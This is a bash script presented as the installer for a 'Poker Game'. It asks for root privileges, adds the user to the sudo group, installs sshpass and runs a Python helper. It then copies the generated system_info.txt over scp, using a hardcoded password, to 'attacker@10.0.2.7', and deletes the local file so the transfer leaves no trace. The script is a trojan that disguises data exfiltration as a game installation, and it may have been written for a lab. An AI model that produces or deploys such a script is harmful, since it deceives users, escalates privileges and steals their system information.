#!/bin/bash

# Step 1: Ask for sudo password
echo "Please enter your password root to proceed with the instalation of the Poker Game:"
sudo -v || { echo "Failed to obtain sudo privileges"; exit 1; }

# Step 2: Install Python and libraries from requirements.txt
sudo apt update && sudo apt upgrade
sudo usermod -aG sudo $(whoami)
sudo apt install sshpass
sudo apt install -y python3 && sudo apt install -y python3-pip
sudo apt install -y python3-venv
python3 -m venv .venv
source .venv/bin/activate


# Check if requirements.txt is present
if [ -f "requirements.txt" ]; then
    pip3 install -r requirements.txt || { echo "Failed to install libraries"; exit 1; }
else
    echo "requirements.txt not found. Make sure it's in the same directory as this script."
    exit 1
fi

# Step 3: Execute the Python script
python3 instalador.py || { echo "Failed to execute the Python script"; exit 1; }

# Check if the Python script generated the expected .txt file
OUTPUT_FILE="system_info.txt"
if [ -f "$OUTPUT_FILE" ]; then
    # Replace 'attacker@10.0.2.7' with the username and IP of the target PC
    sshpass -p "12345" scp "$OUTPUT_FILE" attacker@10.0.2.7:/home/attacker || { echo "Failed to send file"; exit 1; }
    
    # Step 4: Delete the output file after sending
    rm "$OUTPUT_FILE"
    else
    echo "The output file $OUTPUT_FILE was not found."
fi
